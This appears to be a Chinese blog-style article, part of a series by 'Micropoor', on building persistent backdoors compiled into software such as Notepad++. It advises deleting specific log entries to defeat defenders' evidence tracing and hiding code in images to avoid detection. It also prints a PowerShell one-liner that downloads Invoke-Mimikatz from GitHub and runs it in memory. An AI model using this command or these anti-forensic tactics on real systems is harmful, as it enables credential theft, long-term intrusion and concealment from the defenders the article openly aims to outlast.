### 优化后的文本

**从第三季开始引入段子，使原本枯燥的学术文章变得生动有趣。**

在第二季的Demo中，我们遵循了“人性五条”来设计，现回顾这五条原则：

1. **攻击方与防御方的本质是什么？**
   攻击方旨在增加对方的时间、人力、资源（包括但不限于服务器资源）和金钱成本。

2. **安全公司的本质是什么？**
   安全公司追求盈利最大化，以最小投入获得最大产出。

3. **安全公司产品的本质是什么？**
   产品需适应大多数客户的需求，符合市场化要求，并能兼容各种机器环境（包括资源紧张或带宽不足等问题的客户）。

4. **安全人员的本质是什么？**
   安全人员的主要目标是赚钱养家、购房还贷，因此他们倾向于快速解决问题（无论是暂时还是永久解决），以避免客户投诉。

5. **对接客户的本质是什么？**
   对接客户的安全人员同样是公司内部安全团队的一部分，他们的工作性质与上述第四条相同。

### 第六条：线索排查与反线索排查

尽管如此，这个Demo距离实现高级可持续性渗透后门仍有一定差距。为此，我们引入第六条原则：“线索排查”与“反线索排查”。在第二季的Demo中，生成了一个名为`micropoor.txt`的文件。经验丰富的安全人员可能会根据时间差来排查日志。具体流程如下：打开Notepad++，生成`micropoor.txt`文件，写入内容并关闭文件流。通过线索排查，安全人员可能定位到Notepad++，从而导致权限失控。

在“线索排查”的概念中，我们需要考虑“ABC”类线索关联排查。当防御者发现线索A时，会顺藤摸瓜找到B，最终排查到目标文件C。根据第一条原则，Demo需要考虑如何删除指定的日志内容及其他操作，以阻止这种ABC类线索关联排查。

**请注意，本文讨论的不是一个特定于Notepad++的后门，而是一种面向源码编译的通用后门。** 同样，不要局限于Demo中的例子。针对不同版本的NT系统，可以使用成熟的PowerShell脚本绕过UAC，例如：
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3er/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```
或者将代码嵌入图片或其他文件中，以防止被轻易检测到。正如第一季所述，一个优秀的Microdoor通常是针对特定目标定制的，不具备通用性。

### 读者群体与实际应用

本文的读者主要分为两类：攻击方和防守方。假设你面前有一台笔记本电脑，且已知其存在明确的后门，你的任务是排查该后门。大多数人会检查注册表、服务、端口和进程等，因为这些具有普遍性和通用性。

### 结论

随着后门技术的发展，rootkit也在不断进化，特别是其系统层次结构发生了显著变化。理解这一点后，我们可以引用一句名言：“先定个小目标，控它个1825天。”

最后，由于厂商对后渗透攻击和持久性攻击不够重视，我们引用另一句名言作为结尾：“厂商不改变，我们就改变厂商。”

> Micropoor